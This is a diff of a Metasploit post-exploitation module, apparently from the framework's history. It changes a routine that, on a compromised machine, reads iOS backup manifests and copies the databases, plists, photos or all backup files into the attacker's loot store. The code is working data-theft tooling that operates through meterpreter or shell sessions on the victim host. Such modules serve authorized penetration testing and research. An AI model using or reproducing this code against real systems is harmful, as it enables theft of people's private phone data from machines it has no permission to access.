@@ -1,5 +1,5 @@
 ##
-# $Id$
+# $Id$ 
 ##
 
 ##
@@ -25,11 +25,12 @@ class Metasploit3 < Msf::Post
 			'Author'         =>
 				[
 					'hdm',
+					'Satishb3',#Added support to iOS 5 & iOS 6backups - http://www.securitylearn.net
 					'bannedit' # Based on bannedit's pidgin_cred module structure
 				],
 			'Version'        => '$Revision$',
-			'Platform'       => ['windows', 'osx'],
-			'SessionTypes'   => ['meterpreter', 'shell']
+			'Platform'       => ['win','osx'],
+			'SessionTypes'   => ['meterpreter','shell' ]
 		))
 		register_options(
 			[
@@ -78,6 +79,70 @@ class Metasploit3 < Msf::Post
 		end
 
 		process_backups(paths)
+	end
+
+	def process_backups(paths)
+		paths.each {|path| process_backup(path) }
+	end
+
+	def process_backup(path)
+		print_status("Pulling data from #{path}...")
+
+		mbdb_data = ""
+		
+		print_status("Reading Manifest.mbdb from #{path}...")
+		if session.type == "shell"
+			mbdb_data = session.shell_command("cat #{path}/Manifest.mbdb")
+		else
+			mfd = session.fs.file.new("#{path}\\Manifest.mbdb", "rb")
+			until mfd.eof?
+				mbdb_data << mfd.read
+			end
+			mfd.close
+		end
+
+		manifest = Rex::Parser::AppleBackupManifestDB.new(mbdb_data)
+		patterns = []
+		patterns << /\.db$/i if datastore['DATABASES']
+		patterns << /\.plist$/i if datastore['PLISTS']
+		patterns << /\.(jpeg|jpg|png|bmp|tiff|gif)$/i if datastore['IMAGES']
+		patterns << /.*/ if datastore['EVERYTHING']
+
+		done = {}
+		patterns.each do |pat|
+			manifest.entry_offsets.each_pair do |fname,info|
+				next if done[fname]
+				next if not info[:filename].to_s =~ pat
+
+				print_status("Downloading #{info[:domain]} #{info[:filename]}...")
+
+				begin
+				fdata = ""
+				if session.type == "shell"
+					fdata = session.shell_command("cat #{path}/#{fname}")
+				else
+					mfd = session.fs.file.new("#{path}\\#{fname}", "rb")
+					until mfd.eof?
+						fdata << mfd.read
+					end
+					mfd.close
+				end
+				bname = info[:filename] || "unknown.bin"
+				rname = info[:domain].to_s + "_" + bname
+				rname = rname.gsub(/\/|\\/, ".").gsub(/\s+/, "_").gsub(/[^A-Za-z0-9\.\_]/, '').gsub(/_+/, "_")
+				ctype = "application/octet-stream"
+
+				store_loot("ios.backup.data", ctype, session, fdata, rname, "iOS Backup: #{rname}")
+
+				rescue ::Interrupt
+					raise $!
+				rescue ::Exception => e
+					print_error("Failed to download #{fname}: #{e.class} #{e}")
+				end
+
+				done[fname] = true
+			end
+		end
 	end
 
 	def enum_users_unix
@@ -165,94 +230,6 @@ class Metasploit3 < Msf::Post
 		dirs
 	end
 
-	def process_backups(paths)
-		paths.each {|path| process_backup(path) }
-	end
-
-	def process_backup(path)
-
-		print_status("Pulling data from #{path}...")
-
-		mbdb_data = ""
-		mbdx_data = ""
-
-		print_status("Reading Manifest.mbdb from #{path}...")
-		if session.type == "shell"
-			mbdb_data = session.shell_command("cat #{path}/Manifest.mbdb")
-			if mbdb_data =~ /No such file/i
-				print_status("Manifest.mbdb not found in #{path}...")
-				return
-			end
-		else
-			mfd = session.fs.file.new("#{path}\\Manifest.mbdb", "rb")
-			until mfd.eof?
-				mbdb_data << mfd.read
-			end
-			mfd.close
-		end
-
-		print_status("Reading Manifest.mbdx from #{path}...")
-		if session.type == "shell"
-			mbdx_data = session.shell_command("cat #{path}/Manifest.mbdx")
-			if mbdx_data =~ /No such file/i
-				print_status("Manifest.mbdx not found in #{path}...")
-				return
-			end
-		else
-			mfd = session.fs.file.new("#{path}\\Manifest.mbdx", "rb")
-			until mfd.eof?
-				mbdx_data << mfd.read
-			end
-			mfd.close
-		end
-
-		manifest = Rex::Parser::AppleBackupManifestDB.new(mbdb_data, mbdx_data)
-
-		patterns = []
-		patterns << /\.db$/i if datastore['DATABASES']
-		patterns << /\.plist$/i if datastore['PLISTS']
-		patterns << /\.(jpeg|jpg|png|bmp|tiff|gif)$/i if datastore['IMAGES']
-		patterns << /.*/ if datastore['EVERYTHING']
-
-		done = {}
-		patterns.each do |pat|
-			manifest.entries.each_pair do |fname, info|
-				next if done[fname]
-				next if not info[:filename].to_s =~ pat
-
-				print_status("Downloading #{info[:domain]} #{info[:filename]}...")
-
-				begin
-
-				fdata = ""
-				if session.type == "shell"
-					fdata = session.shell_command("cat #{path}/#{fname}")
-				else
-					mfd = session.fs.file.new("#{path}\\#{fname}", "rb")
-					until mfd.eof?
-						fdata << mfd.read
-					end
-					mfd.close
-				end
-				bname = info[:filename] || "unknown.bin"
-				rname = info[:domain].to_s + "_" + bname
-				rname = rname.gsub(/\/|\\/, ".").gsub(/\s+/, "_").gsub(/[^A-Za-z0-9\.\_]/, '').gsub(/_+/, "_")
-				ctype = "application/octet-stream"
-
-				store_loot("ios.backup.data", ctype, session, fdata, rname, "iOS Backup: #{rname}")
-
-				rescue ::Interrupt
-					raise $!
-				rescue ::Exception => e
-					print_error("Failed to download #{fname}: #{e.class} #{e}")
-				end
-
-				done[fname] = true
-			end
-		end
-	end
-
-
 	def got_root?
 		case @platform
 		when :windows
@@ -270,7 +247,7 @@ class Metasploit3 < Msf::Post
 			end
 		end
 	end
-
+		
 	def whoami
 		if @platform == :windows
 			session.fs.file.expand_path("%USERNAME%")
@@ -278,4 +255,5 @@ class Metasploit3 < Msf::Post
 			session.shell_command("whoami").chomp
 		end
 	end
+
 end
